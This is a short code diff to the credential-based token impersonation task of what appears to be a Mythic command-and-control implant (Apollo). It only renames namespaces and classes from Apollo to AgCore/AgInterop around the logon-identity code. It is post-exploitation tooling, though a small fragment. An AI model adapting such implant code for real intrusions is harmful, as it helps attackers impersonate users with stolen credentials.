@@ -6,10 +6,10 @@
 
 #if MAKE_TOKEN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Structs.MythicStructs;
+using AgInterop.Classes;
+using AgInterop.Interfaces;
+using AgInterop.Structs.AgCoreStructs;
+using AgInterop.Structs.MythicStructs;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
 
@@ -25,7 +25,7 @@ namespace Tasks
             [DataMember(Name = "netOnly")]
             public bool NetOnly;
         }
-        public make_token(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public make_token(IAgent agent, AgInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
         public override void Start()
@@ -47,7 +47,7 @@ namespace Tasks
             else
             {
                 var old = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                ApolloLogonInformation info = new ApolloLogonInformation(
+                AgCoreLogonInformation info = new AgCoreLogonInformation(
                     parameters.Credential.Account,
                     parameters.Credential.CredentialMaterial,
                     parameters.Credential.Realm,
